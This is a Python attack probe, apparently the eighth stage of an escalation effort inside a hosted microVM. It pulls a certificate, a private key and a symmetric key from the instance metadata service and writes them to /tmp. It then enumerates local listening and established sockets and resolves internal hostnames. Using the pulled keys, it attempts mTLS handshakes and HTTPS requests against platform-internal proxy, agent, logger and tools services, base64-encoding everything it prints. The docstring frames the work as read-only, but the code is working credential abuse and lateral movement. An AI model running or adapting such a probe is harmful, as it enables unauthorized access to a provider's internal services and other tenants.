"""
probe_stage8_mtls.py — final probe for 11-3.

Goal: settle whether the Kepler instance-group key set fetched in Stage 6
actually authorizes the customer microVM to complete mTLS handshakes
against Kepler-internal services. If yes, the trust-circle participation
primitive is end-to-end-executable, not just plausible.

Steps:
  1. Re-fetch cert chain + private key + symkey from MMDS (so probe is
     self-contained).
  2. Write them to /tmp/k_cert.pem, /tmp/k_key.pem, /tmp/k_sym.b64.
  3. Walk /proc/net/tcp[6] for ALL listening ports (state 0A) and decode.
  4. For each candidate (127.0.0.1:p, [::1]:p, [::]:p, peer-IPs we saw
     established connections to in Stage 7), run:
       openssl s_client -connect <addr>:<port> -cert /tmp/k_cert.pem
         -key /tmp/k_key.pem -CAfile /tmp/k_cert.pem
         -showcerts -verify_return_error -no_ign_eof
       (with -servername set to plausible SNI values)
  5. Parse handshake outcome — record: did handshake succeed? what
     server cert was offered? what's the cipher? error?
  6. DNS-resolve us-east-1.prod.kepler-analytics.aws.dev — see if it
     returns an IP from this netns and what it routes to.
  7. Bonus: try a plain TCP connect to peer IPs we observed in Stage 7
     ESTABLISHED state from uid 992/993/994 to see what's reachable.

Read-only. The handshakes attempt to AUTHENTICATE as a member of
isolation_group 0315f5ba-... (which we are — we hold the legitimate
key material). No data is sent post-handshake.
"""

import os
import sys
import json
import base64
import time
import socket
import struct
import subprocess


def _b64(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.b64encode(data).decode()


def _run(cmd, timeout=15, input_bytes=None):
    try:
        r = subprocess.run(
            cmd, capture_output=True, timeout=timeout, input=input_bytes)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b'', f'<{type(e).__name__}:{e}>'.encode()


def fetch_keys():
    """Pull cert+key+sym from MMDS and write to /tmp/."""
    rc, tok, _ = _run([
        'curl', '-s', '-m', '5', '-X', 'PUT',
        'http://169.254.169.254/latest/api/token',
        '-H', 'X-aws-ec2-metadata-token-ttl-seconds: 120'])
    if rc != 0:
        return None
    token = tok.strip().decode()

    def imds(path):
        return _run([
            'curl', '-s', '-m', '5',
            f'http://169.254.169.254{path}',
            '-H', f'X-aws-ec2-metadata-token: {token}'])

    keys = {}
    rc, body, _ = imds(
        '/latest/meta-data/tags/instance/aws_instance-group-cert-chain-pem')
    if rc == 0 and body:
        with open('/tmp/k_cert.pem', 'wb') as f:
            f.write(body)
        keys['cert_pem_len'] = len(body)
    rc, body, _ = imds(
        '/latest/meta-data/tags/instance/aws_instance-group-private-key-pem')
    if rc == 0 and body:
        with open('/tmp/k_key.pem', 'wb') as f:
            f.write(body)
        os.chmod('/tmp/k_key.pem', 0o600)
        keys['key_pem_len'] = len(body)
    rc, body, _ = imds(
        '/latest/meta-data/tags/instance/aws_instance-group-symmetric-key')
    if rc == 0 and body:
        with open('/tmp/k_sym.b64', 'wb') as f:
            f.write(body)
        keys['sym_len'] = len(body)
    rc, body, _ = imds(
        '/latest/meta-data/tags/instance/aws_application-instance-group-key')
    if rc == 0 and body:
        keys['group_key'] = body.decode().strip()
    return keys


def list_listening_ports():
    """Return list of (proto, addr_str, port_int, uid) for listening sockets."""
    out = []
    for fname, label, is_ipv6 in (
            ('/proc/net/tcp', 'tcp4', False),
            ('/proc/net/tcp6', 'tcp6', True)):
        try:
            with open(fname, 'r') as f:
                lines = f.read().splitlines()
        except Exception:
            continue
        for line in lines[1:]:
            parts = line.split()
            if len(parts) < 10:
                continue
            local, _, state = parts[1], parts[2], parts[3]
            uid = parts[7]
            if state != '0A':  # LISTEN
                continue
            addr_hex, port_hex = local.split(':')
            port = int(port_hex, 16)
            if is_ipv6:
                # 16-byte address, little-endian per 32-bit word
                ab = bytes.fromhex(addr_hex)
                # /proc shows 4 little-endian u32s; reverse each 4 bytes
                addr_bytes = b''.join(
                    bytes(reversed(ab[i:i+4])) for i in range(0, 16, 4))
                addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                ab = bytes.fromhex(addr_hex)
                addr = '.'.join(str(b) for b in reversed(ab))
            out.append((label, addr, port, uid))
    return out


def list_established_peers():
    """Return list of (proto, peer_addr_str, peer_port, uid) for ESTABLISHED
    where local-side is loopback or internal. Used to find non-localhost
    Kepler peers."""
    out = []
    for fname, label, is_ipv6 in (
            ('/proc/net/tcp', 'tcp4', False),
            ('/proc/net/tcp6', 'tcp6', True)):
        try:
            with open(fname, 'r') as f:
                lines = f.read().splitlines()
        except Exception:
            continue
        for line in lines[1:]:
            parts = line.split()
            if len(parts) < 10:
                continue
            local, remote, state = parts[1], parts[2], parts[3]
            uid = parts[7]
            if state != '01':
                continue
            ah, ph = remote.split(':')
            port = int(ph, 16)
            if is_ipv6:
                ab = bytes.fromhex(ah)
                addr_bytes = b''.join(
                    bytes(reversed(ab[i:i+4])) for i in range(0, 16, 4))
                addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
            else:
                ab = bytes.fromhex(ah)
                addr = '.'.join(str(b) for b in reversed(ab))
            out.append((label, addr, port, uid))
    return out


def try_mtls(addr, port, sni=None, label=None):
    """Run openssl s_client with our cert+key. Returns dict with outcome."""
    cmd = [
        'openssl', 's_client',
        '-connect', f'{addr}:{port}' if ':' not in addr else f'[{addr}]:{port}',
        '-cert', '/tmp/k_cert.pem',
        '-key', '/tmp/k_key.pem',
        '-showcerts',
        '-msg',
        '-verify', '5',
    ]
    if sni:
        cmd.extend(['-servername', sni])
    # Send CRLF then close so s_client exits promptly
    rc, stdout, stderr = _run(cmd, timeout=12, input_bytes=b'\n\n')
    return {
        'rc': rc,
        'stdout': stdout[:8000],
        'stderr': stderr[:4000],
    }


def try_plain_connect(addr, port):
    try:
        family = socket.AF_INET6 if ':' in addr else socket.AF_INET
        s = socket.socket(family, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((addr, port))
        s.close()
        return 'OPEN'
    except Exception as e:
        return f'{type(e).__name__}:{e}'


def try_https_get(url, sni=None):
    """Curl with our cert+key against a target URL — checks if the server
    answers HTTP behind mTLS."""
    cmd = [
        'curl', '-s', '-v', '-m', '8',
        '-o', '/tmp/k_resp.bin',
        '-w', '\\nHTTP=%{http_code}\\nSIZE=%{size_download}\\n',
        '--cert', '/tmp/k_cert.pem',
        '--key', '/tmp/k_key.pem',
        url,
    ]
    if sni:
        # curl uses --resolve to pin SNI
        pass
    rc, out, err = _run(cmd, timeout=12)
    body = b''
    try:
        body = open('/tmp/k_resp.bin', 'rb').read()[:2000]
    except Exception:
        pass
    return rc, out, err, body


def main():
    print('PROBE=stage8-mtls v1')

    # Step 1: pull keys
    keys = fetch_keys()
    if not keys:
        print('S8_KEYS_FETCH_FAILED=1')
        print('END')
        return
    print(f'S8_KEYS={_b64(json.dumps(keys).encode())}')

    # Step 2: enumerate listening ports
    listen = list_listening_ports()
    print(f'S8_LISTEN_COUNT={len(listen)}')
    print(f'S8_LISTEN={_b64(json.dumps(listen).encode())}')
    estab = list_established_peers()
    # Distinct external peers (non-loopback)
    distinct_external = sorted({(p[0], p[1], p[2]) for p in estab
                                if not p[1].startswith('127.')
                                and not p[1].startswith('::')
                                and not p[1].startswith('169.254.')})
    print(f'S8_ESTAB_EXTERNAL={_b64(json.dumps(distinct_external).encode())}')

    # Step 3: DNS resolve kepler-analytics
    for hn in (
        'us-east-1.prod.kepler-analytics.aws.dev',
        'kepler-analytics.aws.dev',
        'kepler-ola-us-east-1-prod-logs-bucket.s3.us-east-1.amazonaws.com',
        'genesis-primitives.aws.dev',
    ):
        rc, out, err = _run(['getent', 'hosts', hn], timeout=8)
        print(f'S8_DNS[{hn}]_RC={rc}')
        if out:
            print(f'S8_DNS[{hn}]_OUT={_b64(out[:500])}')
        if err:
            print(f'S8_DNS[{hn}]_ERR={_b64(err[:300])}')

    # Step 4: openssl s_client mTLS attempts
    candidates = [
        # (addr, port, sni, label)
        ('127.0.0.1', 8443, None, 'platform-proxy:8443'),
        ('::1',       8443, None, 'platform-proxy:8443-v6'),
        ('127.0.0.1', 1571, None, 'platform-agent:1571'),
        ('::1',       1571, None, 'platform-agent:1571-v6'),
        ('127.0.0.1', 48620, None, 'platform-server:48620'),
        ('127.0.0.1', 8080, None, 'tools-server:8080'),
        ('127.0.0.1', 1144, None, 'unknown:1144'),
        ('127.0.0.1', 1514, None, 'platform-logger:1514'),
        # SNI-driven trial against the kepler-analytics cert subject
        ('127.0.0.1', 8443, 'us-east-1.prod.kepler-analytics.aws.dev',
         'platform-proxy-with-sni'),
        ('::1',       8443, 'us-east-1.prod.kepler-analytics.aws.dev',
         'platform-proxy-with-sni-v6'),
    ]

    for addr, port, sni, label in candidates:
        # Pre-check: is the port even reachable?
        plain = try_plain_connect(addr, port)
        print(f'S8_PLAIN[{label}]={plain}')
        if 'OPEN' not in plain:
            continue
        out = try_mtls(addr, port, sni=sni, label=label)
        print(f'S8_MTLS[{label}]_RC={out["rc"]}')
        if out['stdout']:
            # Look for handshake success markers
            so = out['stdout']
            ok = b'Verify return code: 0' in so or b'New, TLSv1' in so
            print(f'S8_MTLS[{label}]_HSOK={ok}')
            print(f'S8_MTLS[{label}]_STDOUT={_b64(so[:6000])}')
        if out['stderr']:
            print(f'S8_MTLS[{label}]_STDERR={_b64(out["stderr"][:2000])}')

    # Step 5: try a real HTTPS GET behind mTLS to platform-proxy
    for url in (
        'https://127.0.0.1:8443/',
        'https://localhost:8443/',
    ):
        rc, out, err, body = try_https_get(url)
        print(f'S8_HTTPS[{url}]_RC={rc}')
        if body:
            print(f'S8_HTTPS[{url}]_BODY={_b64(body[:1500])}')
        if out:
            # http_code marker
            print(f'S8_HTTPS[{url}]_OUT={_b64(out[:1500])}')
        if err:
            print(f'S8_HTTPS[{url}]_ERR={_b64(err[:1500])}')

    print('END')


if __name__ == '__main__':
    main()
